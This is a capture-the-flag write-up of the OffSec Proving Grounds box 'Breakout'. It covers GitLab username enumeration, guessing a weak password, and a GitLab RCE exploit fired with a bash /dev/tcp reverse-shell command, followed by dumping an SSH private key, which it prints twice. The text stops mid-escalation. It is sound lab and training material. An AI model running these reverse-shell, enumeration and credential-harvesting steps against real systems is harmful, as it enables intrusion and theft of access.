### Breakout Proving Grounds Practice

### Difficulty = Intermediate

### IP Address = 192.168.168.182

Nmap Scan:

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Breakout]
└─$ nmap -sCV -A 192.168.168.182 -p22,80 -oN nmapscan   
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-26 23:00 WAT
Nmap scan report for 192.168.168.182
Host is up (0.68s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
80/tcp open  http    nginx
| http-robots.txt: 54 disallowed entries (15 shown)
| / /autocomplete/users /autocomplete/projects /search 
| /admin /profile /dashboard /users /help /s/ /-/profile /-/ide/ 
|_/*/new /*/edit /*/raw
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://192.168.168.182/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 62.31 seconds

```

Lets check the web server on port 80 out

Its running an instance of gitlab
![image](https://user-images.githubusercontent.com/113513376/214960058-14a14c29-a21f-4a7c-8905-6360fd342f32.png)

Since i don't have any username to authenticate as 

I'll create an account as it allows creation of account
![image](https://user-images.githubusercontent.com/113513376/214960380-ee291ea5-82df-4dd8-b28c-fb8960dace5b.png)

```
Username: pwner
Email: pwner@localhost.com
Password: hackerpwner
```


I tried logging in but it says its under approval
![image](https://user-images.githubusercontent.com/113513376/214963501-88947f4a-64e4-4975-9c5a-52b058c40bc1.png)

So we need to find a way to get logged in as a valid user

Luckily for us gitlab can be abused to perfrom username enumeration in the register function
![image](https://user-images.githubusercontent.com/113513376/214963700-f0a9d1ce-5df1-468c-bb6b-282b316b736a.png)

But when i search `admin` its not a valid user on the gitlab instance
![image](https://user-images.githubusercontent.com/113513376/214963830-2bd3e81f-6cbf-4de0-871c-26f4ee903c84.png)


So i'll use a script which will perform the username enumeration

Here's the script i'll use [Userenum](https://www.exploit-db.com/exploits/49821)

Now lets check it out

Running it we see the arguments needed

```
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                     GitLab User Enumeration Script
                            Version 1.0

Description: It prints out the usernames that exist in your victim's GitLab CE instance

Disclaimer: Do not run this script against GitLab.com! Also keep in mind that this PoC is meant only
for educational purpose and ethical use. Running it against systems that you do not own or have the
right permission is totally on your own risk.

Author: @4DoniiS [https://github.com/4D0niiS]
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


usage: ./gitlab_user_enum.sh --url <URL> --userlist <Username Wordlist>

PARAMETERS:
-------------
-u/--url  The URL of your victim's GitLab instance
--userlist  Path to a username wordlist file (one per line)
-h/--help  Show this help message and exit


Example:
-------------
./gitlab_user_enum.sh --url http://gitlab.local/ --userlist /home/user/usernames.txt

The URL of your GitLab target (--url) is missing. 
```

So i'll pass in the arguments and a userlist

I used grep to filter the error http code and the `echo loop`
```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Breakout]
└─$ bash userenum.sh --url http://192.168.168.182/ --userlist /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt | grep -v "LOOP\|302"

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                     GitLab User Enumeration Script
                            Version 1.0

Description: It prints out the usernames that exist in your victim's GitLab CE instance

Disclaimer: Do not run this script against GitLab.com! Also keep in mind that this PoC is meant only
for educational purpose and ethical use. Running it against systems that you do not own or have the
right permission is totally on your own risk.

Author: @4DoniiS [https://github.com/4D0niiS]
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


200
[+] The username webmaster exists!
200
[+] The username root exists!
200
[+] The username michelle exists!

```

Now that we have valid users

I'll try loggin in as `michelle` using her name as the password also `michelle:michelle`
![image](https://user-images.githubusercontent.com/113513376/214967465-f05e2a14-7bbb-4182-bf3b-29af7e1bbb82.png)

Boom!!! It worked
![image](https://user-images.githubusercontent.com/113513376/214967520-d4cf963f-493f-4459-a2a5-d3ff077a489a.png)

Now searching google for a way to get shell leads to this remote code execution exploit [Exploit](https://www.exploit-db.com/exploits/49951)

So lets try it out 

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Breakout]
└─$ python3 exploit.py --help                                         
usage: exploit.py [-h] -u U -p P -c C -t T

GitLab < 13.10.3 RCE

options:
  -h, --help  show this help message and exit
  -u U        Username
  -p P        Password
  -c C        Command
  -t T        URL (Eg: http://gitlab.example.com)
```

Now we know the arguments to pass lets try it out then

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Breakout]
└─$ python3 exploit.py -u michelle -p michelle -t http://192.168.168.182/ -c "bash -c 'bash -i >& /dev/tcp/192.168.45.5/1337 0>&1'"
[1] Authenticating
Successfully Authenticated
[2] Creating Payload 
[3] Creating Snippet and Uploading
```

It hangs there but back on our listener we get a connection

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Breakout]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [192.168.45.5] from (UNKNOWN) [192.168.168.182] 39226
bash: cannot set terminal process group (339): Inappropriate ioctl for device
bash: no job control in this shell
git@breakout:~/gitlab-workhorse$
```

So lets stabilize the shell

```
python3 -c "import pty; pty.spawn('/bin/bash')"
export TERM=xterm
CTRL + Z
stty raw -echo;fg
reset
```

Cool now lets escalate priv

On checking the backups directory i see an idrsa file

```
git@breakout:~$ cd backups
cd backups
git@breakout:~/backups$ ls -al
ls -al
total 12
drwx------  2 git  root 4096 Mar  3  2022 .
drwxr-xr-x 20 root root 4096 Jan 23 09:40 ..
-rwxr-xr-x  1 root root 2602 Mar  3  2022 mykey
git@breakout:~/backups$ cat mykey
cat mykey
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
git@breakout:~/backups$ 
```

ID_RSA:

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

But I have no idea for which user it belongs to 

Trying it on user michelle doesn't work

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Breakout]
└─$ nano id_rsa  
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Breakout]
└─$ chmod 600 id_rsa 
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Breakout]
└─$ ssh -i id_rsa michelle@192.168.168.182        
michelle@192.168.168.182's password: 
```

So maybe there are other users on the box

We can get list of users in a gitlab instance using a valid api token









